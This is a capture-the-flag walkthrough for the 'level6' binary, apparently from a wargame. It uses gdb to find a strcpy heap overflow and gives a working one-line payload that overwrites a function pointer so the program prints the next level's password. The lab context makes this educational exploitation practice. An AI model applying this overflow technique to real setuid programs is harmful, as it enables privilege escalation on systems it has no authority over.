Execute the *level6* binary:

```bash
./level6
```

```
Segmentation fault (core dumped)
```

```bash
./level6 test
```

```
Nope
```


> Note the *level6* binary need an argument.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```gdb
Dump of assembler code for function main:
...
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>   ; first call to malloc (64 bytes)
...
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>   ; second call to malloc (4 bytes)
...
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>   ; copy argv[1] in the first allocated address
...
   0x080484d0 <+84>:	call   eax                      ; call the function from the second allocated address
...                                                     ; by default 0x8048468 (m function)
End of assembler dump.
```

Check the default called *m* function:

```gdb
disass m
```

```
Dump of assembler code for function m:
...
   0x0804846e <+6>:	    mov    DWORD PTR [esp],0x80485d1    ; retrieve the "Nope" string
   0x08048475 <+13>:	call   0x8048360 <puts@plt>         ; call puts for print the "Nope" string
...
End of assembler dump.
```

> *x/s 0x80485d1* to display the string printed.

> Here the *m* function is not interesting.

Check for other interisting functions, maybe for replace the *m* function:

```gdb
info functions
```

```
All defined functions:

...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

Check the *n* function:

```gdb
disass n
```

```
Dump of assembler code for function n:
...
   0x0804845a <+6>:	    mov    DWORD PTR [esp],0x80485b0    ; retrieve the "/bin/cat /home/user/level7/.pass" string
   0x08048461 <+13>:	call   0x8048370 <system@plt>       ; call puts for print the 
...                                                         ; "/bin/cat /home/user/level7/.pass" string
End of assembler dump.
```

This function *n* at the address __0x08048454__ is now the goal.

For replace the *m* function call by the *n* one, the buffer/address returnd by malloc must be changed to the *n* function address instead of the *m* one.

```gdb
break *0x08048491
break *0x080484a1
run
info register eax
continue
info register eax
```

```
eax            0x804a008	134520840
eax            0x804a050	134520912
```

> The first address allocated is __0x804a008__ and the second one is __0x804a050__.

The malloc calls return always the same addresses because the [ASLR](https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR#:~:text=Address%20space%20layout%20randomization%20(ASLR)%20is%20a%20memory%2Dprotection,executables%20are%20loaded%20into%20memory.) is not active:

```bash
file ./level6
```

```
./level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
```

> *LSB executable* means the program [doesn't implement ASLR](https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code).

So the address returned by malloc is always __0x804a008__ for the first call and __0x804a050__ for the second one (because sizes are fixed to 64 bytes and 4 bytes).

> Note these to allocated addresses are neighbors and the second (with the *m* address) is after the first (first binary argument).

After check the man of the *strcpy* function, note the section *BUGS*:

```
If the destination string of a strcpy() is not large enough,  then  anything  might
happen.   Overflowing  fixed-length  string buffers is a favorite cracker technique
for taking complete control of the machine.  Any time a  program  reads  or  copies
data  into  a  buffer,  the program first needs to check that there's enough space.
This may be unnecessary if you can show that overflow is impossible, but  be  care‐
ful:  programs can get changed over time, in ways that may make the impossible pos‐
sible.
```

Because strcpy is not protected against overflows, lets write some padding bytes in the first allocation (reading the first binary argument) to reach the second one and put in the *n* function address for replace the *m* one.

Compute how many padding bytes/characters needed:

Second allocated address - first allocated address = 0x804a050 - 0x804a008 = 134520912 - 134520840 = __72 bytes__.

- Put the __72__ bytes/characters to reach the second allocated address containing the address of the function called at the end of the main.
- Put the address of the of the *n* function to overwrite the default one (*m*) (reversed because the stack is readed in the opposite way = \x54\84\x04\x08).

```bash
./level6 `echo -e '........................................................................\x54\x84\x04\x08'`
```

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```